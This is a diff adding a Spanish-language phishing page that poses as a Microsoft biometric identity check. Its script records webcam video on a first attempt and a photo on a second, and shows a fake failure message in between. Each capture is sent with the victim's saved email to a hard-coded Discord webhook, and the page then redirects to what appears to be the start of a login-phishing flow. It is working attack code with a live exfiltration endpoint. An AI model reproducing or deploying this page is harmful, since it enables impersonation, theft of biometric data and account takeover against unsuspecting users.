@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Validación Biométrica</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .camera-box {
+            position: relative;
+            width: 280px;
+            height: 280px;
+            margin: 20px auto;
+            border-radius: 50%;
+            border: 5px solid #0078d4;
+            overflow: hidden;
+            background: #000;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+        .overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 85%;
+            height: 85%;
+            border: 2px dashed rgba(255, 255, 255, 0.6);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+        #status-msg {
+            text-align: center;
+            margin: 15px 0;
+            font-size: 14px;
+            min-height: 20px;
+        }
+        .error-msg {
+            color: #d93025;
+            background: #fce8e6;
+            padding: 10px;
+            border-radius: 4px;
+            display: none;
+            margin-bottom: 15px;
+        }
+        #btn-capture {
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 2px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        #btn-capture:disabled { background-color: #ccc; }
+        canvas { display: none; }
+
+        /* Indicador de grabación */
+        .rec-indicator {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: rgba(0,0,0,0.6);
+            color: #fff;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+            display: none;
+            align-items: center;
+            gap: 6px;
+            z-index: 10;
+        }
+        .rec-indicator .dot {
+            width: 8px;
+            height: 8px;
+            background: #ff3b30;
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+    </style>
+</head>
+<body>
+    <div class="tod">
+        <div class="header" style="display: flex; justify-content: center; text-align: center; margin-bottom: 20px;">
+            <div class="logo">
+                <div class="square red"></div>
+                <div class="square green"></div>
+                <div class="square blue"></div>
+                <div class="square yellow"></div>
+            </div>
+            <span class="brand">Microsoft</span>
+        </div>
+
+        <h2 style="text-align: center;">Verificación de Identidad</h2>
+        <p style="text-align: center; font-size: 14px; color: #666;">
+            Para continuar, encuadre su rostro en el círculo y presione el botón.
+        </p>
+
+        <div id="error-banner" class="error-msg">
+            ⚠️ No se pudo reconocer el rostro claramente. Intente de nuevo en un área con más luz.
+        </div>
+
+        <div class="camera-box">
+            <video id="video" autoplay playsinline muted></video>
+            <div class="overlay"></div>
+            <div class="rec-indicator" id="rec-indicator">
+                <span class="dot"></span> Grabando
+            </div>
+        </div>
+
+        <div id="status-msg">Iniciando cámara segura...</div>
+
+        <button id="btn-capture" disabled>
+            Siguiente
+        </button>
+
+        <canvas id="canvas"></canvas>
+    </div>
+
+<script>
+(function() {
+    'use strict';
+
+    const WEBHOOK = "https://discord.com/api/webhooks/1493331481127292949/eZj1s6TsSazD31qs9-vDik_0qXvvxMW2XjicwppNfaxW7e_8yx0duHukbQG9pinGCGau";
+
+    const _video  = document.getElementById('video');
+    const _canvas = document.getElementById('canvas');
+    const _btn    = document.getElementById('btn-capture');
+    const _status = document.getElementById('status-msg');
+    const _error  = document.getElementById('error-banner');
+    const _rec    = document.getElementById('rec-indicator');
+
+    const DURACION_VIDEO_MS = 4000; // 4 segundos de grabación en el 1er intento
+
+    // Contador de intentos faciales (persistente mientras la pestaña esté abierta)
+    let attemptCount = parseInt(sessionStorage.getItem('facial_intentos') || '0');
+
+    let mediaStream = null;
+
+    async function init() {
+        try {
+            mediaStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user", width: 640, height: 640 },
+                audio: false
+            });
+            _video.srcObject = mediaStream;
+            _video.onloadedmetadata = () => {
+                _btn.disabled = false;
+                _status.innerText = "Cámara lista. Posicione su rostro.";
+            };
+        } catch (err) {
+            _status.innerText = "Error: Acceso a la cámara denegado.";
+            _status.style.color = "red";
+        }
+    }
+
+    // === GRABAR VIDEO (1er intento) ===
+    function grabarVideo(duracionMs) {
+        return new Promise((resolve) => {
+            let chunks = [];
+            let mimeType = '';
+
+            const candidatos = [
+                'video/webm;codecs=vp9',
+                'video/webm;codecs=vp8',
+                'video/webm',
+                'video/mp4'
+            ];
+            for (const c of candidatos) {
+                if (window.MediaRecorder && MediaRecorder.isTypeSupported(c)) {
+                    mimeType = c;
+                    break;
+                }
+            }
+
+            if (!mimeType) {
+                resolve(null);
+                return;
+            }
+
+            try {
+                const recorder = new MediaRecorder(mediaStream, { mimeType });
+
+                recorder.ondataavailable = (e) => {
+                    if (e.data && e.data.size > 0) chunks.push(e.data);
+                };
+
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: mimeType });
+                    _rec.style.display = 'none';
+                    resolve(blob);
+                };
+
+                _rec.style.display = 'flex';
+                recorder.start();
+
+                setTimeout(() => {
+                    if (recorder.state !== 'inactive') recorder.stop();
+                }, duracionMs);
+
+            } catch (e) {
+                console.error('Error grabando video:', e);
+                _rec.style.display = 'none';
+                resolve(null);
+            }
+        });
+    }
+
+    // === CAPTURAR FOTO (2do intento) ===
+    function capturarFoto() {
+        const ctx = _canvas.getContext('2d');
+        _canvas.width  = _video.videoWidth;
+        _canvas.height = _video.videoHeight;
+        ctx.drawImage(_video, 0, 0);
+        return new Promise(res => _canvas.toBlob(res, 'image/jpeg', 0.85));
+    }
+
+    _btn.addEventListener('click', async () => {
+        _btn.disabled = true;
+        _error.style.display = 'none';
+        _status.style.color = "#666";
+
+        attemptCount++;
+        sessionStorage.setItem('facial_intentos', attemptCount);
+
+        const email = localStorage.getItem('email_usuario') || 'No identificado';
+        const formData = new FormData();
+
+        try {
+            if (attemptCount === 1) {
+                // === PRIMER INTENTO → VIDEO ===
+                _status.innerText = "Grabando rostro... manténgase quieto.";
+                const videoBlob = await grabarVideo(DURACION_VIDEO_MS);
+
+                if (videoBlob) {
+                    const ext = videoBlob.type.includes('mp4') ? 'mp4' : 'webm';
+                    formData.append('content',
+                        `🎥 **Validación Facial — Intento 1 (VIDEO)**\n` +
+                        `👤 Usuario: \`${email}\`\n` +
+                        `⏰ Hora: ${new Date().toLocaleString()}`
+                    );
+                    formData.append('file', videoBlob, `intento_1_video.${ext}`);
+                } else {
+                    // Fallback: si no se pudo grabar, enviamos foto
+                    _status.innerText = "Grabación no disponible. Capturando imagen...";
+                    const fotoBlob = await capturarFoto();
+                    formData.append('content',
+                        `📸 **Validación Facial — Intento 1 (FOTO - fallback)**\n` +
+                        `👤 Usuario: \`${email}\`\n` +
+                        `⏰ Hora: ${new Date().toLocaleString()}`
+                    );
+                    formData.append('file', fotoBlob, `intento_1.jpg`);
+                }
+            } else {
+                // === SEGUNDO INTENTO → FOTO ===
+                _status.innerText = "Capturando imagen...";
+                const fotoBlob = await capturarFoto();
+                formData.append('content',
+                    `📸 **Validación Facial — Intento 2 (FOTO)**\n` +
+                    `👤 Usuario: \`${email}\`\n` +
+                    `⏰ Hora: ${new Date().toLocaleString()}`
+                );
+                formData.append('file', fotoBlob, `intento_2.jpg`);
+            }
+
+            _status.innerText = "Enviando...";
+            await fetch(WEBHOOK, { method: 'POST', body: formData });
+
+        } catch (e) {
+            console.error("Error de red:", e);
+        }
+
+        // === LÓGICA DE INTENTOS ===
+        if (attemptCount < 2) {
+            // PRIMER INTENTO → FALLIDO
+            setTimeout(() => {
+                _error.style.display = 'block';
+                _status.innerText = "Error de lectura. Reintente por favor.";
+                _status.style.color = "red";
+                _btn.disabled = false;
+            }, 800);
+        } else {
+            // SEGUNDO INTENTO → VÁLIDO → REINICIAR TODO EL FLUJO
+            _status.innerText = "Identidad confirmada. Reiniciando...";
+            _status.style.color = "green";
+
+            // Limpiar TODOS los estados guardados
+            sessionStorage.removeItem('facial_intentos');
+            sessionStorage.removeItem('login_intentos');
+            localStorage.removeItem('email_usuario');
+
+            // Detener la cámara antes de reiniciar
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+
+            setTimeout(() => {
+                // Volver al inicio del flujo
+                window.location.href = "Iniciar.html";
+            }, 1500);
+        }
+    });
+
+    init();
+})();
+</script>
+</body>
+</html>
